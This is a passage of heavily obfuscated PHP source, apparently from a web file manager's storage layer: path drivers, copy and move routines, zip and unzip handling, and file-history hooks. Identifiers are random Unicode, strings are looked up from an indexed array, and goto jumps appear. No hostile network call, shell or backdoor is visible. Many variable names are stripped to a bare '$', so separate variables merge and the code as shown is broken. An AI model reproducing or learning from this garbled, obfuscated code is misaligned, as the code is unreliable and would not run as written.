$this->iconvSystem($ғ); return @is_dir($ғ); } public function listPath($ѻ؂, $➋ = false) { $ =& $_SERVER[ʯ]; $ѻ؂ = $this->iconvSystem($ѻ؂); $ѻ؂ = rtrim($ѻ؂, $[8]) . $[8]; $ = array($[92] => array(), $[93] => array()); if (!($㨐 = @opendir($ѻ؂))) { return $; } while (($Ǽ = readdir($㨐)) !== !1) { if ($Ǽ == $[10] || $Ǽ == $[1340]) { continue; } $ = $ѻ؂ . $Ǽ; if (is_file($)) { $[$[93]][] = $this->fileInfo($, $➋); } else { $[$[92]][] = $this->folderInfo($, $➋); } } closedir($㨐); return $; } public function listAll($瑯ߖ, &$ڛѴ = array()) { $ք =& $_SERVER[ʯ]; $瑯ߖ = $this->iconvSystem($瑯ߖ); $瑯ߖ = rtrim($瑯ߖ, $ք[8]) . $ք[8]; if (!($Ň = @opendir($瑯ߖ))) { return $ڛѴ; } while (($ = readdir($Ň)) !== !1) { if ($ == $ք[10] || $ == $ք[1340]) { continue; } $ϸ = $瑯ߖ . $; $ = is_dir($ϸ) && !is_link($ϸ) ? 1 : 0; $ϸ = $ ? $ϸ . $ք[8] : $ϸ; $ڛѴ[] = array($ք[94] => $ϸ, $ք[85] => $, $ք[95] => intval(@filemtime($ϸ)), $ք[86] => $ ? 0 : intval($this->size($ϸ))); if ($) { $this->listAll($ϸ, $ڛѴ); } } closedir($Ň); return $ڛѴ; } public function has($, $ = false, $ڮ˱ = true) { $Ĉ =& $_SERVER[ʯ]; $ = $this->iconvSystem($); $ = rtrim($, $Ĉ[8]) . $Ĉ[8]; if (!($ = @opendir($))) { return !1; } $환ҩ = 0; $ۂ = 0; $߼ݺ = 0; while (($ = readdir($)) !== !1) { if ($ == $Ĉ[10] || $ == $Ĉ[1340]) { continue; } $ = $ . $; if ($) { $߼ݺ++; if (@is_file($)) { $환ҩ++; } else { $ۂ++; } if ($߼ݺ > 10000) { break; } continue; } if ($ڮ˱) { if (@is_file($)) { return !0; } } else { if (@is_dir($ . $Ĉ[8])) { return !0; } } } closedir($); if ($) { return array($Ĉ[232] => $환ҩ, $Ĉ[233] => $ۂ); } return !1; } public function hashSimple($) { $ĜƜ =& $_SERVER[ʯ]; if (!$) { return md5($ĜƜ[12]); } $ = $this->iconvSystem($); $ = $this->size($); $ټ = 200; $Ç = 50; if ($ <= $ټ * $Ç) { return $this->hashMd5($) . $; } $ = $ĜƜ[12]; $Ő = intval($ / $Ç); $Ɩ = fopen($, $ĜƜ[1426]); if (!$Ɩ) { return $; } for ($̖ = 0; $̖ < $Ç; $̖++) { fseek_64($Ɩ, $Ő * $̖); $ .= fread($Ɩ, $ټ); } fseek_64($Ɩ, $ - $ټ); $ .= fread($Ɩ, $ټ); fclose($Ɩ); return md5($) . $; } public function getContent($ǣ) { $ǣ = $this->iconvSystem($ǣ); return file_get_contents($ǣ); } public function setContent($ӂ, $ = '') { $ӂ = $this->iconvSystem($ӂ); $씓 = @file_put_contents($ӂ, $, LOCK_EX); clearstatcache(); @chmod($ӂ, $this->pathAuth); return $씓 === !1 ? !1 : !0; } public function fileSubstr($Ȝ, $遣 = 0, $ʖ = false) { $ =& $_SERVER[ʯ]; $Ȝ = $this->iconvSystem($Ȝ); if ($ʖ === !1) { $ʖ = $this->size($Ȝ); } if ($ʖ <= 0) { return $[12]; } $˽ = fopen($Ȝ, $[1426]); if (!$˽) { return !1; } fseek_64($˽, $遣); $֓ = fread($˽, $ʖ); fclose($˽); return $֓; } public function upload($̳, $Ö, $ = false, $׿ = REPEAT_REPLACE) { if ($) { return $this->moveFile($Ö, $̳); } return $this->copyFile($Ö, $̳); } public function setModifyTime($ػӷ, $ʆ = '') { @touch($ػӷ, intval($ʆ)); } public function download($, $ʕ) { return $this->iconvSystem($); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($큶) { parent::__construct($큶); $this->signatureVersion($_SERVER[ʯ][240]); } public function fileOutLink($Тħ) { $橬 =& $_SERVER[ʯ]; if (substr($Тħ, 0, 7) == $橬[1391]) { $Тħ = $橬[1392] . substr($Тħ, 7); } header($橬[171] . $Тħ); die; } } goto C; E: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($, $) { $ =& $_SERVER[ʯ]; $Ң = $; $GLOBALS[$[1207]] = $[1208] . $; Hook::trigger($[1208] . $ . $[1209], $Ң); $͡׊ = self::driverMake($[0]); if (!$͡׊) { return !1; } if (method_exists($͡׊, $)) { $ֺ = @call_user_func_array(array($͡׊, $), $); } else { if (method_exists($͡׊, $[1210])) { $ֺ = @call_user_func_array(array($͡׊, $), $); } else { if (method_exists(self, $)) { $ֺ = @call_user_func_array(array(self, $), $); } else { $ֺ = call_user_func_array(array(parent, $), $); } } } Hook::trigger($[1208] . $ . $[1211], $Ң, $ֺ); return $ֺ; } public static function init($) { return self::driverMake($); } public static function copy($, $Α, $Ϳ = false, $גǌ = false) { return self::copyMoveStart($, $Α, $Ϳ, $_SERVER[ʯ][594], $גǌ); } public static function move($, $ΰ, $ = false, $굩 = false) { return self::copyMoveStart($, $ΰ, $, $_SERVER[ʯ][596], $굩); } private static function copyMoveStart($ݯ, $, $ǲ, $, $Ɂ) { $㌕ =& $_SERVER[ʯ]; $쵘 = array($ݯ, $, $ǲ, $Ɂ); Hook::trigger($㌕[1208] . $ . $㌕[1209], $쵘); $ = self::copyMove($ݯ, $, $ǲ, $, $Ɂ); Hook::trigger($㌕[1208] . $ . $㌕[1211], $쵘, $); return $; } public static function saveFile($敘, $ސ̅, $ = true) { $ƶ =& $_SERVER[ʯ]; $ڣ = self::info($ސ̅); $֙ = self::driverMake($敘); $ = self::driverMake($ސ̅); $ = !1; if ($->pathParse[$ƶ[1212]]) { $ = $; $ = $->pathParse[$ƶ[1212]]; $ = self::driverMake($); } if ($֙->pathParse[$ƶ[1212]]) { $θ = $֙->pathParse[$ƶ[1212]]; $֙ = self::driverMake($θ); } $Ơ = $->pathFather($ސ̅); $⍍ = !0; if (!$ && self::driverIsSame($֙, $)) { $⍍ = !1; } $ = self::copyFile($֙, $敘, $, $Ơ, $ڣ[$ƶ[42]], $⍍); if ($) { $ = $->getPathOuter($); } return $; } private static function copyMove($㐕, $, $ǧ, $, $Ó = false) { $Կ =& $_SERVER[ʯ]; if (!$㐕 || $㐕 == $Կ[8] || !$) { return !1; } ignore_timeout(); $ = self::driverMake($㐕); $ = self::driverMake($); $ = $ == $Կ[596]; $ͅ = !1; if ($->pathParse[$Կ[1212]]) { $ͅ = $; $ = $->pathParse[$Կ[1212]]; $ = self::driverMake($); } if ($->pathParse[$Կ[1212]]) { $㐕 = $->pathParse[$Կ[1212]]; $ = self::driverMake($㐕); } self::check($, $㐕, $, $); Hook::trigger($Կ[1213], $, $㐕, $, $); $ = self::driverIsSame($, $); if ($) { if ($ == $Կ[596] && !method_exists($, $Կ[1214]) && trim($, $Կ[8]) == trim($->pathFather($㐕), $Կ[8])) { if ($->pathThis($㐕) != $Ó && !$->isTypeObject()) { return $->rename($㐕, $Ó); } return $->getPathOuter($㐕); } if (method_exists($, $)) { return $->{$}($㐕, $, $ǧ, $Ó); } } if ($ && $ == $Կ[596] && $->getType() == $Կ[116]) { $ = $->movePath($㐕, $, $Ó); if ($) { return $; } } $ = $->isFile($㐕); if (!$ && $->getType() == $Կ[817] && $->getType() == $Կ[116]) { $ = $->copyFolderFromIO($, $㐕, $, $ǧ, $, $Ó); } else { $ = self::copyPath($, $㐕, $, $, $ǧ, $, $, $Ó); } if ($ && $) { $->remove($㐕); } if ($ͅ) { $ = $ͅ->getPathOuter($); } return $; } private static function check($, $, $Щ, &$ȗ) { $ݛř =& $_SERVER[ʯ]; if (self::driverIsSame($, $Щ) && $->isFolder($) && $->isParentOf($, $ȗ)) { show_json(LNG($ݛř[1215]), !1); } if (!$->exist($)) { show_json(LNG($ݛř[115]), !1); } } private static function copyPath($ן, $Ղ, $, $, $Ӛ, $ĩݵ, $߅㚏, $Ϫ = false, $ꙧ = true) { $Ÿ͸ =& $_SERVER[ʯ]; $Ї = empty($Ϫ) && $Ϫ !== $Ÿ͸[221] ? $ן->pathThis($Ղ) : $Ϫ; if ($Ӛ) { $ = $->fileNameExist($, $Ї); $ = $Ї; $Ї = $->fileNameAuto($, $Ї, $Ӛ, !$߅㚏); if (!$ || $ != $Ї) { $Ӛ = !1; } if ($ꙧ && !$Ӛ) { $->_data[$Ÿ͸[1216]] = !0; } } if ($߅㚏) { return self::copyFile($ן, $Ղ, $, $, $Ї, $ĩݵ); } if ($Ӛ == REPEAT_RENAME_FOLDER) { $Ӛ = !1; } $ = rtrim($, $Ÿ͸[8]) . $Ÿ͸[8] . $Ї; $ = $->mkdir($->getPath($), $Ӛ); $ = $->getPathInner($); $ = $ן->listPath($Ղ, !0); $ = is_array($) ? $ : array($Ÿ͸[93] => array(), $Ÿ͸[92] => array()); $쳲 = array_merge($[$Ÿ͸[93]], $[$Ÿ͸[92]]); foreach ($쳲 as $܌) { $ڼ = $܌[$Ÿ͸[43]] == $Ÿ͸[223]; $Ղ = $ן->getPathInner($܌[$Ÿ͸[94]]); $ۏ = self::copyPath($ן, $Ղ, $, $, $Ӛ, $ĩݵ, $ڼ, !1, !1); if (!$ۏ) { IO::errorTips($Ÿ͸[1217] . $Ղ . $Ÿ͸[80] . $); } } self::copyMoveKeepInfo($ן, $Ղ, $); return $; } private static function copyFile($ϼ, $, $, $Ր, $ٹΌ, $돑) { $¾ =& $_SERVER[ʯ]; $Ր = $->getPath(rtrim($Ր, $¾[8]) . $¾[8] . $ٹΌ); $󆰬 = $¾[1218] . time() . rand_string(5); Hook::trigger($¾[1219], $ϼ, $, $, $Ր, $ٹΌ, $󆰬); if (self::driverIsSame($ϼ, $)) { if ($돑) { $ = $->moveFile($, $Ր); } else { $ = $->copyFile($, $Ր); } Hook::trigger($¾[1220], $ϼ, $, $, $Ր, $ٹΌ, $); self::copyMoveKeepInfo($ϼ, $, $); return $; } $ = TEMP_FILES; if ($GLOBALS[$¾[6]][$¾[99]][$¾[856]]) { $ = $GLOBALS[$¾[6]][$¾[99]][$¾[856]]; } $ = $; mk_dir($); $Ԏ = $ . $󆰬; $ǝ = $Ԏ; $Ԏ = $ϼ->download($, $Ԏ); $Ԏ = $ϼ->iconvApp($Ԏ); if (substr($Ԏ, strlen($)) == $) { $돑 = !0; } $ = $->upload($Ր, $Ԏ, $돑); self::remove($ǝ); Hook::trigger($¾[1220], $ϼ, $, $, $Ր, $ٹΌ, $); self::copyMoveKeepInfo($ϼ, $, $); return $; } private static function copyMoveKeepInfo($, $Ց, $) { if (!$) { return; } $Ռ = $->info($Ց); if (!is_array($Ռ)) { return; } IO::setModifyTime($, $Ռ[$_SERVER[ʯ][95]]); } public static function pathFather($) { $ӵ = IO::init($); $ǿ = $ӵ->pathFather($ӵ->path); return $ӵ->getPathOuter($ǿ); } public static function fileOut($򞶶, $鎑 = false, $ = false, $Ҥ = '') { $֔ = self::driverMake($򞶶); if ($֔->isFileOutServer()) { return $֔->fileOutServer($򞶶, $鎑, $, $Ҥ); } return $֔->fileOut($򞶶, $鎑, $, $Ҥ); } public static function fileOutImage($, $ٲ = 250) { $ = array(250, 600, 1200, 2000, 3000, 5000); for ($֐ = 0; $֐ < count($); $֐++) { if ($֐ == 0 && $ٲ <= $[$֐]) { $ٲ = $[$֐]; break; } else { if ($ٲ > $[$֐ - 1] && $ٲ <= $[$֐]) { $ٲ = $[$֐]; break; } else { if ($֐ == count($) - 1 && $ٲ > $[$֐]) { $ٲ = $[$֐]; break; } } } } $ӄ = self::driverMake($); if ($ӄ->isFileOutServer()) { return $ӄ->fileOutImageServer($, $ٲ); } return $ӄ->fileOutImage($, $ٲ); } private static function driverIsSame($, $ɿ𗳂) { $ =& $_SERVER[ʯ]; $ấ = $->getType(); $͊ = $ɿ𗳂->getType(); if ($ấ != $͊) { return !1; } if ($ấ == $[817]) { return !0; } if ($ấ == $[116]) { return !0; } if ($->pathDriver == $ɿ𗳂->pathDriver) { return !0; } return !1; } public static function copyUpdate($茷, $) { $ =& $_SERVER[ʯ]; if (!IO::exist($茷)) { return !1; } if (!IO::exist($)) { IO::mkdir($); } $խж = array_to_keyvalue(self::listAllSimple($茷), $[94]); $泚 = array_to_keyvalue(self::listAllSimple($), $[94]); $ݕ = array(); $Ř = array(); foreach ($խж as $ => $) { if (isset($泚[$])) { if ($[$[85]] == 1) { continue; } if ($泚[$][$[86]] == $[$[86]]) { continue; } } if ($[$[85]] == 1) { $Ř[] = $ . $[8] . trim($, $[8]); continue; } $ = strstr(trim($, $[8]), $[8]) ? get_path_father($) : $[12]; $ݕ[] = array($[1221] => $[$[96]], $[1222] => rtrim($, $[8]) . $[8] . $, $[1223] => $); } $֕ = array($[223] => $ݕ, $[85] => $Ř); Hook::trigger($[1224], $茷, $, $֕); foreach ($Ř as $) { IO::mkdir($); } foreach ($ݕ as $) { IO::copy($[$[1221]], $[$[1222]], REPEAT_REPLACE); } } public static function fileSubstr($, $, $՞ = false) { $ɓ =& $_SERVER[ʯ]; $̌ = self::driverMake($); $ɕ = $̌->size($); $Ҫ = $; $򬅛 = $՞; if ($ < 0) { $ = $ɕ + $; } if ($՞ === !1) { $՞ = $ɕ - $; } if ($ + $՞ > $ɕ) { $՞ = $ɕ - $; } if (!$ɕ && $̌->getType() == $ɓ[116] && !$̌->exist($)) { $ = get_path_this($); $Ŏ = parse_url_query($); if (is_array($Ŏ) && isset($Ŏ[$ɓ[42]])) { $ = urldecode($Ŏ[$ɓ[42]]); } throw new Exception($ɓ[1225] . LNG($ɓ[1226]) . $ɓ[1027] . clear_html($) . $ɓ[12]); } if ($՞ <= 0) { return $ɓ[12]; } if ($ < 0 || $ >= $ɕ || $՞ > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\145\x52\145\x61\x64\x20\145\162\x72\157\x72\41\x20\163\164\x61\162\164\75{$}\x3b\154\x65\156\147\164\x68\75{$՞}\73\40\x73\151\172\x65\x3d{$ɕ}\73"); } $ = $̌->fileSubstr($, $, $՞); if (!$ && $՞ && isset($GLOBALS[$ɓ[1227]])) { throw new Exception($GLOBALS[$ɓ[1227]][$ɓ[1228]]); } return $; } private static function driverMake(&$߭) { $ހ =& $_SERVER[ʯ]; $̗ = KodIO::parse($߭); if (!self::$driverListSystem) { $Һ = Model($ހ[827])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Һ, $ހ[451]); } if ($̗[$ހ[43]] == KodIO::KOD_IO && !self::$driverListSystem[$̗[$ހ[451]]]) { return !1; } $߭ = $̗[$ހ[1229]]; $Ê = self::driverGet($̗, $߭); return $Ê; } private static function driverGet($ܙ, &$) { $ͯ =& $_SERVER[ʯ]; $ъ = $ܙ[$ͯ[1230]]; $Ɣ = $ܙ[$ͯ[451]]; switch ($ܙ[$ͯ[43]]) { case KodIO::KOD_IO: $Ͽ = self::$driverListSystem[$Ɣ]; break; case KodIO::KOD_SOURCE: $ = $Ɣ . $; $Ͽ = array($ͯ[1231] => $ͯ[1232], $ͯ[6] => $ܙ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ = $GLOBALS[$ͯ[1233]]; self::$driverListUser = array_to_keyvalue($, $ͯ[451]); } $Ͽ = self::$driverListUser[$Ɣ]; break; case KodIO::KOD_SHARE_LINK: $Ͽ = array($ͯ[1231] => $ͯ[1234], $ͯ[6] => $ܙ); $ = Action($ͯ[1235])->sharePathInfo($ܙ[$ͯ[94]]); $ = $[$ͯ[190]]; if (!$[$ͯ[190]]) { $˒ = Model($ͯ[640])->getInfo($[$ͯ[641]]); $ = KodIO::clear($˒[$ͯ[1236]] . $ܙ[$ͯ[1229]]); $ܙ[$ͯ[536]] = $˒; $ܙ[$ͯ[1212]] = $; $Ͽ = array($ͯ[1231] => $ͯ[1237], $ͯ[6] => $ܙ); } break; case KodIO::KOD_SHARE_ITEM: $Ͽ = array($ͯ[1231] => $ͯ[1238], $ͯ[6] => $ܙ); $˒ = Model($ͯ[640])->getInfo($ܙ[$ͯ[451]]); if ($˒[$ͯ[190]] == $ͯ[221]) { $ = KodIO::clear($˒[$ͯ[1236]] . $ܙ[$ͯ[1229]]); $ܙ[$ͯ[536]] = $˒; $ܙ[$ͯ[1212]] = $; $Ͽ = array($ͯ[1231] => $ͯ[1239], $ͯ[6] => $ܙ); } else { if (!$) { $ = $˒[$ͯ[190]]; } } break; default: $ = $ܙ[$ͯ[94]]; $Ͽ = array($ͯ[1231] => $ͯ[1240]); break; } $ = $ܙ[$ͯ[94]]; if (!isset(self::$driverCache[$])) { $ۧ = strtolower($Ͽ[$ͯ[105]]); $ܔ = $GLOBALS[$ͯ[6]][$ͯ[99]][$ͯ[886]]; $ղ = $ͯ[84] . (isset($ܔ[$ۧ]) ? $ܔ[$ۧ] : ucfirst($ۧ)); if (!class_exists($ղ)) { show_json("{$ղ}\40\x6e\x6f\164\40\x65\170\x69\163\164\163\41", !1); } $׻ = isset($Ͽ[$ͯ[6]]) ? $Ͽ[$ͯ[6]] : !1; self::$driverCache[$] = new $ղ($׻); } $ = self::$driverCache[$]; $->pathDriver = $ъ; $->pathBase = $ͯ[12]; if (isset($Ͽ[$ͯ[6]][$ͯ[1241]])) { $->pathBase = rtrim($Ͽ[$ͯ[6]][$ͯ[1241]], $ͯ[8]) . $ͯ[8]; $ = $->pathBase . ltrim($, $ͯ[8]); } $ = $->getPath($); if (isset($ܙ[$ͯ[1212]])) { $ = $ܙ[$ͯ[1212]]; } $->path = $; return $; } public static function errorTips($ = false) { $ =& $_SERVER[ʯ]; static $а = array(); $ܳ = 1000; if ($ === -1) { return $а ? $а[count($а) - 1] : $[12]; } if ($ === !1) { return implode($[18], $а); } if (count($а) >= $ܳ) { $а = array_slice($а, $ܳ * 0.5, $ܳ); } $а[] = $; write_log($[172] . ACTION . $[1242] . $, $[1243]); } public static function getLastError($ = '') { $ = self::errorTips(-1); return $ ? $ : $; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ʸ; if ($ʸ) { return $ʸ; } $ȱ = IO::init($_SERVER[ʯ][8]); return $ȱ; } private static function iconvSystem($) { return self::local()->iconvSystem($); } private static function iconvApp($) { return self::local()->iconvApp($); } public static function zipFolder($, $۹ = "\x7a\x69\160", $Ꝇ = '', $ = REPEAT_RENAME) { $̭ =& $_SERVER[ʯ]; $ = IO::listPath($); if (!$) { return !1; } $ = array_merge($[$̭[92]], $[$̭[93]]); return self::zip($, $۹, $Ꝇ, $); } public static function zip($º, $ = "\172\x69\160", $ = '', $ެп = REPEAT_RENAME) { $ =& $_SERVER[ʯ]; if (is_string($º) && $º) { $º = array(array($[94] => $º)); } $ = self::init($º[0][$[94]]); $ = self::info($º[0][$[94]]); $Ÿ = $[12]; $ = $[12]; $巊 = $[12]; if ($ && substr($, -1, 1) != $[8]) { $ = get_path_father($); $巊 = get_path_this($); } else { $ = self::pathFather($[$[94]]); $巊 = $[$[42]] . $[10] . $; if (count($º) > 1) { $Ȑ = IO::info($); $巊 = $Ȑ[$[42]] . $[10] . $; } if ($) { $ = $; } } if ($->getType() == $[116]) { $ܑ = self::init($); $ڌٖ = $ܑ->getType() == $[116] ? $ : get_path_father($->path); $ڌٖ = rtrim($ڌٖ, $[8]) . $[8]; mk_dir($ڌٖ); } else { $Ÿ = TEMP_FILES . $[1244] . time() . rand_string(8) . $[8]; mk_dir($Ÿ); file_put_contents($Ÿ . $[1245], $[12]); $ڌٖ = $Ÿ; } $ = IO::info($ڌٖ); if (!$ || !$[$[226]]) { show_json(LNG($[1246]), !1); } $鐼 = self::zipFileList($º, $Ÿ); foreach ($鐼 as $ř => $) { $鐼[$ř] = self::iconvSystem($); } $ = get_filename_auto($ڌٖ . $巊, $[12], $ެп); KodArchive::create(self::iconvSystem($), $鐼); if (!IO::exist($)) { if ($Ÿ) { del_dir($Ÿ); } show_json(LNG($[1247]), !1); } if (!$Ÿ) { return $; } $ƛ = self::move($, $, $ެп); if ($Ÿ) { del_dir($Ÿ); } if (!$) { show_json(LNG($[1247]), !1); } return $ƛ; } public static function unzip($, $ŷ, $Ѱ = "\55\x31", $Ւ = "\x72\x65\160\x6c\x61\143\145") { $ʝۊ =& $_SERVER[ʯ]; $ҍ = parent::info($); if (!$ҍ) { show_json(LNG($ʝۊ[1248]), !1); } $΃ = IO::infoFullSimple($ŷ); if (!$΃) { $ŷ = IO::mkdir($ŷ); } if (isset($΃[$ʝۊ[190]]) && trim($΃[$ʝۊ[94]], $ʝۊ[8]) != trim($ŷ, $ʝۊ[8])) { $硍 = KodIO::make($΃[$ʝۊ[189]]); $ = IO::fileNameAuto($硍, $΃[$ʝۊ[42]], REPEAT_RENAME_FOLDER, !0); $ŷ = IO::mkdir($硍 . $); } $Ѱ = $Ѱ && $Ѱ != $ʝۊ[1249] ? @json_decode($Ѱ, !0) : -1; $ = self::unzipPart($, $Ѱ); if (!$ || !IO::exist($[$ʝۊ[223]])) { show_json(LNG($ʝۊ[115]), !1); } $Ò = $[$ʝۊ[1250]][count($[$ʝۊ[1250]]) - 1]; if ($Ò[$ʝۊ[1251]] == -1 || substr($Ò[$ʝۊ[42]], -1, 1) == $ʝۊ[8]) { $ޥЈ = $[$ʝۊ[1252]] . rand_string(10) . $ʝۊ[8]; mk_dir($ޥЈ); $Ø = count($[$ʝۊ[1250]]) == 1 ? IO::ext($) : get_path_ext($[$ʝۊ[223]]); $Υ = KodArchive::extract(self::iconvSystem($[$ʝۊ[223]]), $ޥЈ, $Ò[$ʝۊ[1251]], $, $Ø); self::unzipErrorCheck($Υ, array($ʝۊ[1253], $, $Ø, $ŷ, $)); Hook::trigger($ʝۊ[1254], $ޥЈ); recursion_dir($ޥЈ, $γ, $ƈ, 0); $܊̘ = array_merge($γ, $ƈ); $ = array(); foreach ($܊̘ as $׊) { $ԯ = IO::move(self::iconvApp($׊), $ŷ, $Ւ); if ($ԯ) { $[] = $ԯ; } } del_dir($ޥЈ); } else { $ԯ = IO::move($[$ʝۊ[223]], $ŷ, $Ւ, get_path_this($Ò[$ʝۊ[42]])); if ($ԯ) { $[] = $ԯ; } } return $ ? $ : !1; } public static function unzipList($) { $ =& $_SERVER[ʯ]; $ϫ = isset($[$[1255]]) ? $[$[1255]] : !1; $ = isset($[$[1251]]) ? @json_decode($[$[1251]], !0) : -1; $״ = self::unzipPart($[$[94]], $); if (!$״ || !IO::exist($״[$[223]])) { show_json(LNG($[115]), !1); } $꙼ = $״[$[1250]][count($״[$[1250]]) - 1]; $ܸ = in_array(IO::ext($״[$[223]]), array($[365], $[1256], $[1257], $[1258], $[1259], $[1260])); if (!$ϫ && ($꙼[$[1251]] == -1 || $ܸ)) { $閇 = $״[$[1252]] . get_path_this($״[$[223]]) . $[1261]; if (!IO::exist($閇)) { $ө뱮 = $꙼[$[1251]] == -1 ? get_path_ext(IO::pathThis($[$[94]])) : get_path_ext($״[$[223]]); $ = KodArchive::listContent(self::iconvSystem($״[$[223]]), !0, $ө뱮); self::unzipErrorCheck($, array($[1262], $, $״)); @file_put_contents($閇, json_encode($[$[1263]])); } return @json_decode(IO::getContent($閇), !0); } IO::fileOut($״[$[223]], $ϫ, get_path_this($꙼[$[42]])); die; } private static function zipFileList($, $ܡ = false) { $ÿ =& $_SERVER[ʯ]; $ = array(); foreach ($ as $) { $ų̍ = $[$ÿ[94]]; if ($ܡ) { $ų̍ = self::copy($[$ÿ[94]], $ܡ, $ÿ[878]); } else { $⏆ = self::init($[$ÿ[94]]); if ($⏆->getType() == $ÿ[116]) { $ų̍ = $⏆->path; } } if ($ų̍ && self::local()->exist($ų̍)) { $[$[$ÿ[94]]] = $ų̍; } } if (!empty($)) { return array_values($); } show_json(LNG($ÿ[1226]), !1); } private static function localFilePath($ݰ) { $ =& $_SERVER[ʯ]; $쎢 = KodIO::parse($ݰ); if ($쎢[$[43]] == KodIO::KOD_SOURCE) { $œ = Model($[885])->fileInfoGet(KodIO::sourceID($ݰ)); if (!$œ[$[94]]) { show_json($[1264], !1); } $ݰ = $œ[$[94]]; } $ӭ = self::init($ݰ); if ($ӭ->pathParse[$[1212]]) { $ݰ = $ӭ->pathParse[$[1212]]; $ӭ = self::init($ݰ); } $ = $ӭ->getType(); if ($ == $[116] || $ == $[1265]) { if (!$ӭ->exist($ӭ->path)) { show_json(LNG($[115]), !1); } return $ӭ->path; } return !1; } public static function unzipPart($, $Ԭ = -1) { $ =& $_SERVER[ʯ]; $ = IO::pathThis($); if (!$Ԭ || $Ԭ == -1) { $׈ = array(array($[42] => $, $[1251] => -1)); $׈[0][$[1266]] = $׈[0][$[42]]; } else { if (is_array($Ԭ)) { $׈ = $Ԭ; $ = count($׈) - 1; for ($əځ = 0; $əځ <= $; $əځ++) { $Ł𝲕 = $׈[$əځ]; $ = get_path_this($Ł𝲕[$[42]]) . (checkExtSafe($Ł𝲕[$[42]]) ? $[12] : $[1267]); $׈[$əځ][$[1266]] = $[1268] . intval($Ł𝲕[$[1251]]) . $[438] . $; if ($əځ == 0) { continue; } $׈[$əځ][$[1266]] = $׈[$əځ - 1][$[1266]] . $[1269] . $׈[$əځ][$[1266]]; } } } if (!is_array($׈) || count($׈) == 0) { return !1; } $ = $׈[count($׈) - 1]; if (!IO::exist($)) { return !1; } $ = TEMP_FILES . $[1270] . kodIO::hashPathSafe($) . $[8]; $͋ߊ = $ . $[$[1266]]; mk_dir($); file_put_contents(TEMP_FILES . $[1245], $[12]); if (IO::exist($͋ߊ)) { return array($[223] => $͋ߊ, $[1250] => $׈, $[1252] => $); } $ = self::localFilePath($); if (!$) { $ = $ . $[1271]; if (!IO::exist($)) { self::copy($, $, !1, get_path_this($)); } } if (!$ || !IO::exist($)) { return !1; } if ($[$[1251]] == -1) { return array($[223] => $, $[1250] => $׈, $[1252] => $); } $ = $; foreach ($׈ as $əځ => $Ł𝲕) { if (!$Ł𝲕 || $Ł𝲕[$[1251]] == $[1249]) { break; } if (substr($Ł𝲕[$[42]], -1, 1) == $[8]) { break; } $ = in_array(get_path_ext($Ł𝲕[$[1266]]), array($[365], $[1256], $[1257], $[1258], $[1259], $[1260])); $ = $əځ == count($׈) - 1 && $; $̹ = $ . $Ł𝲕[$[1266]]; $ = $ . get_path_this($Ł𝲕[$[42]]); if (IO::exist($̹)) { $ = $̹; continue; } $ܗ͘ = $əځ == 0 ? get_path_ext($) : get_path_ext($); $팝 = KodArchive::extract(self::iconvSystem($), $, $Ł𝲕[$[1251]], $Ν, $ܗ͘); self::unzipErrorCheck($팝, array($[1272], $, $׈, $Ł𝲕, $̹)); if (IO::exist($)) { IO::rename($, get_path_this($̹)); } $ = $̹; } $͋ߊ = $; return array($[223] => $, $[1250] => $׈, $[1252] => $); } private static function unzipErrorCheck($, $ = false) { $ =& $_SERVER[ʯ]; if ($[$[1273]]) { return !0; } write_log(array($[1274], $, $), $[1275]); show_json($[1276] . json_encode($[$[1263]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Ӻ =& $_SERVER[ʯ]; $ = $GLOBALS[$Ӻ[6]][$Ӻ[99]]; if ($[$Ӻ[1277]] != 1) { return; } if ($[$Ӻ[1278]] <= 0) { return; } if (isset($_REQUEST[$Ӻ[1279]]) && $_REQUEST[$Ӻ[1279]] == $Ӻ[98]) { return; } Hook::bind($Ӻ[1280], $Ӻ[1281]); Hook::bind($Ӻ[1282], $Ӻ[1283]); Hook::bind($Ӻ[1284], $Ӻ[1285]); Hook::bind($Ӻ[1286], $Ӻ[1287]); Hook::bind($Ӻ[1288], $Ӻ[1289]); Hook::bind($Ӻ[1290], $Ӻ[1291]); } public static function eventBeforeUpload($䬩) { if ($䬩[3] && $䬩[3] != REPEAT_REPLACE) { return; } $Ƕ = self::parsePath($䬩[0]); if (!$Ƕ) { return; } self::add($Ƕ); } public static function eventBeforeEdit($צ) { $թ = self::parsePath($צ[0]); if (!$թ) { return; } self::add($թ); } public static function eventBeforeCopyFile($ؼ, $Ӄ, $Ƥ, $, $, $ƞ) { $ =& $_SERVER[ʯ]; if (isset($Ƥ->_data[$[1216]]) && $Ƥ->_data[$[1216]]) { return; } $ = $Ƥ->getPathOuter($); $ = self::parsePath($); if (!$) { return; } self::add($); } public static function eventBeforeRename($ǝ) { $̗ȷ =& $_SERVER[ʯ]; $ = self::parsePath($ǝ[0]); if (!$) { return; } $ = self::checkInHistory($); if (!$) { return; } if ($[$̗ȷ[43]] == $̗ȷ[223]) { $ = self::listData($); if ($ && $[$̗ȷ[421]]) { self::moveHistory($, $ǝ[1]); } } else { IO::rename($[$̗ȷ[94]], $ǝ[1]); } } public static function eventBeforeMove($) { $ =& $_SERVER[ʯ]; $ = self::parsePath($[0]); if (!$) { return; } $ = self::parsePath($[1]); if (!$) { return; } $ = $[3]; $׊ = self::checkInHistory($); if (!$׊) { return; } $筈 = self::pathHistory($); if ($׊[$[43]] == $[223]) { $ = self::listData($); $Б = rtrim($, $[8]) . $[8] . ($ ? $ : get_path_this($)); $Գ˧ = self::listData($Б); if ($ && $[$[421]] && $Գ˧ && $Գ˧[$[421]]) { return self::clear($); } if ($ && $[$[421]]) { self::moveHistory($, $, $筈); } } else { IO::move($׊[$[94]], $筈, !1, $); self::clearEmptyFolder(IO::pathFather($׊[$[94]])); } } public static function eventAfterRemove($, $ן) { $ =& $_SERVER[ʯ]; if (!$ן) { return; } $Ⱥ = self::parsePath($[0]); if (!$Ⱥ) { return; } $ = self::checkInHistory($Ⱥ); if (!$) { return; } if ($[$[43]] == $[223]) { $ = self::listData($Ⱥ, !1); if ($ && $[$[421]]) { self::clear($Ⱥ, !1); } } else { IO::remove($[$[94]]); self::clearEmptyFolder(IO::pathFather($[$[94]])); } } private static function 